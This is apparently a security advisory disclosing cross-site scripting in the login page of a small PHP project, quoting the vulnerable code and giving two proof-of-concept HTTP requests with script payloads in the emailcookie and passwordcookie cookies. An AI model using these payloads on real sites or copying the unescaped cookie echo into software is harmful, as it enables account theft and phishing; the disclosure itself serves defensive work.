## Vulnerability Details

**Credits**: 
> Reigz Macolor (https://github.com/reigz/)<br/>

**Tested On**:
> [Secret-Coder-PHP-Project 1.0](https://github.com/keerti1924/Secret-Coder-PHP-Project/) <br/>

**Affected Version**:
> keerti1924/Secret-Coder-PHP-Project 1.0

**Affected Site Page**: 
> /login.php<br/>

**Affected Code**: 
> <https://github.com/keerti1924/Secret-Coder-PHP-Project/blob/main/login.php> <br/>
```php
<input type="email" class="form-control" id="email" name="email"
placeholder="Email Address" value="<?php
if (isset($_COOKIE['emailcookie'])) {
    echo $_COOKIE['emailcookie'];
} ?>">
```

```php
<input type="password" class="form-control" id="password" name="password"
placeholder="Password" value="<?php
if (isset($_COOKIE['passwordcookie'])) {
    echo $_COOKIE['passwordcookie'];
} ?>">
```

**Related CWE:**
> [CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')](https://cwe.mitre.org/data/definitions/79.html)

## **Details:**
> Login page of Secret-Coder-PHP-Project is vulnerable to XSS by modifying cookies `emailcookie` and `passwordcookie` making the website vulnerable on 2 instances.

Option 1:
```http 
GET /login.php HTTP/2
Host: [REDACTED]
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0
Cookie: emailcookie="><script>alert('reigz')</script>
```
![emailcookie](https://github.com/smurf-reigz/security/assets/48426940/c37efe3d-daca-4635-8202-c972795359b9)

Option 2:
```http 
GET /login.php HTTP/2
Host: [REDACTED]
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0
Cookie: passwordcookie="><script>alert('reigz')</script>
```
![passwordcookie](https://github.com/smurf-reigz/security/assets/48426940/2043088d-1ef0-466a-b684-06f26e6b70a5)

## **Vulnerability Impact:**
> Once the malicious script is injected, the attacker can perform a variety of malicious activities. The attacker could transfer private information, such as cookies that may include session information, from the victim's machine to the attacker. The attacker could send malicious requests to a web site on behalf of the victim, which could be especially dangerous to the site if the victim has administrator privileges to manage that site. Phishing attacks could be used to emulate trusted web sites and trick the victim into entering a password, allowing the attacker to compromise the victim's account on that web site. Finally, the script could exploit a vulnerability in the web browser itself possibly taking over the victim's machine, sometimes referred to as "drive-by hacking."
